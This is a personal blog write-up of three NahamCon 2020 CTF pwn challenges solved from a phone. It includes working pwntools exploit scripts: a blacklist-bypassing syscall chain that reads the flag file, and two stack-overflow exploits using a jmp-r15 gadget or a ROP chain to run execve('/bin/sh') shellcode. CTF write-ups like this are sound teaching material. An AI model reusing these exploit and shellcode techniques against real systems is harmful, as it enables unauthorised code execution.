---
layout: post
title: "Solving (some) NahamCon CTF pwns on mobile!"
description: ""
date: 2020-06-16
tags: [ctf,pwn,blog]
comments: true
---

This past weekend I played a bit of the NahamCon CTF with [WreckTheLine](https://twitter.com/WreckTheLine/status/1271936156570091522), and we placed really well in **2nd place**! I didn't manage to solve many challenges as I was stuck in camp (compulsory army), so I had to get a bit creative and try solving some pwns with only my phone. It was a pretty interesting experience, and I don't urge you to try it out yourself after reading about my approach :P.

# Tools of the Trade

## Linux Environment

First things first we have to create the linux environment in order for us to solve (most) pwn challenges. I made use of a $5/month [DigitalOcean](https://m.do.co/c/78426754c3e6)(my referral link) droplet with the Ubuntu 18.04.3 (LTS) x64 base image.

In order to access this from my Android phone, I made use of the [JuiceSSH](https://play.google.com/store/apps/details?id=com.sonelli.juicessh) app to ssh into the droplet. The app is pretty convenient and has various useful features. One of which, is the `Tmux next/prev window` option in the `Horizontal Swipe` setting. Pairing this with tmux on the droplet allowed me to shift between tmux windows with ease during debugging and exploit writing by swiping left or right on the screen. For my fellow tmux idiots, the following [cheatsheet](https://tmuxcheatsheet.com/) should be ample for this minimal usage of tmux.

<center><img src="{{site.baseurl}}/ctf/nahamcon20/tmux.gif"></center>


## Reversing Environment

Initially, I did consider using r2 as my reversing tool as I would be working primarily through ssh to interact with the linux environment, thus I had no access to GUI applications. However, as my friends would know, my usual reaction to r2 is `:drakeno:`. Fortunately, I found a great alternative that recently introduced its HLIL, [Binary Ninja Cloud](https://cloud.binary.ninja/)! It was not the most amazing user experience considering the UI was probably not designed for mobile browsers, but most of the basic functionality worked fine so it was a great option for me. However, I did find some issues with the output the HLIL produced, so that would be one consideration to make when using this. For a greater experience, use the application on landscape view instead of portrait view as the internal windows are resizeable but not collapsible, so they may occasionally take too much horizontal space, covering useful IL output.

As a note, it is probably a bare minimum to understand the IL syntax of binary ninja to use it for reversing, the official [documentation](https://docs.binary.ninja/dev/bnil-overview.html) is a useful reference for this.

With everything set-up, we can begin working on the actual challenges!

# SaaS
> You've heard of software as a service, but have you heard of syscall as a service?
>
> Connect with:
>
> nc jh2i.com 50016 (Solves: 67, 100 pts)
>
> [saas](saas) [exploit.py](saas-exploit)

This challenge allowed us to run arbitrary syscalls, except for a list of blacklisted syscalls.

```
Welcome to syscall-as-a-service!

Enter rax (decimal): 0
Enter rdi (decimal): 0
Enter rsi (decimal): 0
Enter rdx (decimal): 0
Enter r10 (decimal): 0
Enter r9 (decimal): 0
Enter r8 (decimal): 0
Rax: 0x0
```

An important Binary Ninja HLIL note when reversing this binary is the importance of setting the right types for local variables. In the `blacklist` function, an array of 7 blacklisted syscalls are initalised in a stack int array. However, if we do not create this array in the function local variables, the HLIL will not display the value of these blacklisted syscalls. Here are the screenshots to show this behaviour.

![]({{site.baseurl}}/ctf/nahamcon20/SaaS/notype.jpg)
<center><b>Without</b> setting the type of <code class="highlighter-rouge">banned</code></center><br>

![]({{site.baseurl}}/ctf/nahamcon20/SaaS/type.jpg)
<center><b>With</b> setting the type of <code class="highlighter-rouge">banned</code></center>

The banned syscall numbers are shown in the screenshot and correspond to various syscalls that allow for executing programs (needed for popping a shell), like `execve` or `execveat`. We can simply ignore this and perform a `open`, `read`, `write` of the flag file, guessing the flag file name. `mmap` can be used to create a temporary buffer in memory that we can read and write to, as the binary has PIE enabled, so it's difficult for us to reuse existing RW- memory allocations.

The following annotated exploit code has more details.

{% highlight Python %}
import sys
from pwn import *

if args.REMOTE:
	r = remote("jh2i.com", 50016)
else:
	r = process("./saas")

def syscall(rax, rdi, rsi, rdx, r10, r9, r8, ret=False):
	r.sendlineafter("): ", str(rax))
	r.sendlineafter(": ", str(rdi))
	r.sendlineafter(": ", str(rsi))
	r.sendlineafter(": ", str(rdx))
	r.sendlineafter(": ", str(r10))
	r.sendlineafter(": ", str(r9))
	r.sendlineafter(": ", str(r8))
	if ret:
		r.recvuntil("Rax: ")
		return int(r.recvline().rstrip(), 16)

pause()

# mmap 0xbeef000 for reading/writing data
syscall(9,0xbeef000,0x1000,7,0x22,0,-1)
# read from STDIN(fd=0) to read filename into our buffer
syscall(0,0,0xbeef000,0x1000,0,0,0)
# send filename, taken from script arguments ("flag.txt" was the flag filename)
sleep(0.1)
r.send(sys.argv[-1]+"\x00")
# fd = open(filename)
fd = syscall(2,0xbeef000,0,0,0,0,0, True)
# le = read(fd, ...), reading from flag file to buffer at 0xbeef000
le = syscall(0,fd,0xbeef000,0x1000,0,0,0, True)
# write(STDOUT, 0xbeef000, ...) to write flag contents to STDOUT(fd=1)
syscall(1,1,0xbeef000,le,0,0,0)

# get flag!
r.interactive()
{% endhighlight %}

`flag{rax_rdi_rsi_radical_dude}`

[saas]:{{site.baseurl}}/ctf/nahamcon20/SaaS/saas
[saas-exploit]:{{site.baseurl}}/ctf/nahamcon20/SaaS/exploit.py



# Shifts Ahoy
> I created super advanced encryption software for us to communicate securely.
>
> Connect with:
>
> nc jh2i.com 50015 (Solves: 72, 100 pts)
>
> [shifts-ahoy](shifts) [exploit.py](shifts-exploit)

This challenge presents us with a menu that allows us to encrypt or decrypt text. However, the `decrypt` option is not implemented so we are just limited to encrypting text.

```
Shifts Ahoy™ v1.0.2a

What would you like to do?

1. Encrypt text.
2. Decrypt text.

> 
```

When we `checksec` the binary, we realise that the NX bit is not set, we have a stack mapped with **RWX** permissions!

![]({{site.baseurl}}/ctf/nahamcon20/Shifts_Ahoy/checksec.jpg)

This is very useful as we can load shellcode into the stack. Upon reversing the `encrypt` function, we can note a trivial buffer overflow of the stack buffer which would allow us to overwrite 7 bytes into the saved RIP on stack, followed by a null byte.

![]({{site.baseurl}}/ctf/nahamcon20/Shifts_Ahoy/encrypt.jpg)

Thus, we are allowed to call 1 arbitrary ROP gadget. Fortunately, I found that the execution state left `r15` pointing to our stack buffer, and there was a `jmp r15` ROP gadget in the binary. We could then trivially jump straight to shellcode in our payload. To take the encryption into consideration, we have to send a "decrypted" payload, considering that,

```
encrypt(decrypt(payload)) == payload
```

{% highlight Python %}
import sys
from pwn import *

if args.REMOTE:
	r = remote("jh2i.com", 50015)
else:
	r = process("./shifts")
pause()

def x(i):
	return i-0xd if i >= 0xd else i+0x100-0xd
def p(s):
	return "".join([chr(x(ord(i))) for i in s[:0x40]])+s[0x40:]

def encrypt(s):
	r.sendlineafter("> ", "1")
	if len(s) >= 0x60-1:
		r.sendafter(": ", p(s[:0x5f]))
	else:
		r.sendlineafter(": ", p(s))

# execve("/bin/sh", 0, 0) shellcode
sc = "\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x54\x5f\xb0\x3b\x0f\x05"
encrypt(sc.ljust(0x58, '\x41')+p64(0x00000000004011cd).decode("Latin-1")) # jmp r15 gadget
r.interactive()
{% endhighlight %}

With this, we can pop a shell and get our flag!

`flag{captain_of_the_rot13_ship}`

[shifts]:{{site.baseurl}}/ctf/nahamcon20/Shifts_Ahoy/shifts-ahoy
[shifts-exploit]:{{site.baseurl}}/ctf/nahamcon20/Shifts_Ahoy/exploit.py

# Syrup
> Can you pwn me?
> 
> Connect here:
>
> nc jh2i.com 50036 (Solves: 53, 100 pts)
>
> [syrup](syrup) [exploit.py](syrup-exploit)

This challenge was a very minimal binary with only 3 functions, `start`, `fn1` and `fn2`. For interaction with the user, direct syscalls were used instead of calling libc functions. The bug was yet again a buffer overflow, with certain checks in place that were similar to stack cookies. However, the value was hardcoded and thus we can just write the correct value in our buffer overflow payload. An interesting note is that binary ninja seemed to overlook this check in the MLIL and HLIL views, I'm not sure why.

![]({{site.baseurl}}/ctf/nahamcon20/Syrup/hlil.jpg)
<center><b>HLIL</b></center><br>

![]({{site.baseurl}}/ctf/nahamcon20/Syrup/llil.jpg)
<center><b>LLIL</b></center>

To exploit this, we can use ROP to set the value of `rbp` to `0x402000`(address of the RWX .bss section), and jump to address `0x040105d` in the middle of `fn1`, which allows us to write into `0x402000` with any input. We can write our shellcode there, and allow the ropchain to bring us to `0x402000`, popping our shell to get the flag.

{% highlight Python %}
import sys
from pwn import *

if args.REMOTE:
	r = remote("jh2i.com", 50036)
else:
	r = process("./syrup")
pause()

p = lambda x : p64(x).decode('Latin-1')
rop = 'A'*0x400
rop+= p(0xdead^0xbeef)*2 # stack cookie thing
rop+= p(0x0000000000401011) # pop rbp ; ret
rop+= p(0x402000) # RWX .bss section
rop+= p(0x040105d) # middle of fn1
rop+= p(0xdead^0xbeef)*2 # stack cookie thing
rop+= p(0x402000) # jump to our shellcode
r.sendafter("?", rop)

sleep(0.1)
context.arch = "amd64"
sc = asm(shellcraft.amd64.linux.sh())
r.send(sc)

r.interactive()
{% endhighlight %}

`flag{Sr0ppin_t0_v1ct0Ry}`

[syrup]:{{site.baseurl}}/ctf/nahamcon20/Syrup/syrup
[syrup-exploit]:{{site.baseurl}}/ctf/nahamcon20/Syrup/exploit.py

# Conclusion

Pwning on mobile is certainly possible, but is honestly quite an inconvenient experience. Especially after writing this writeup on the computer and being able to reference the computer web version of Binary Ninja Cloud, it's really far more frustrating to use on mobile. However, I think this set-up could be a possibility for those who do not have access to computers due to their costs. With a phone, internet access, $5 USD/month and lots of patience to drag sliders around in binary ninja's HLIL view, one could possibly practice pwning with a minimal budget.

Hopefully, I won't have to do pwning on mobile much more in the future XD. But seeing as I'm going to be the Singapore army's version of a security guard for 2 more years T-T, I may not have much of a choice...
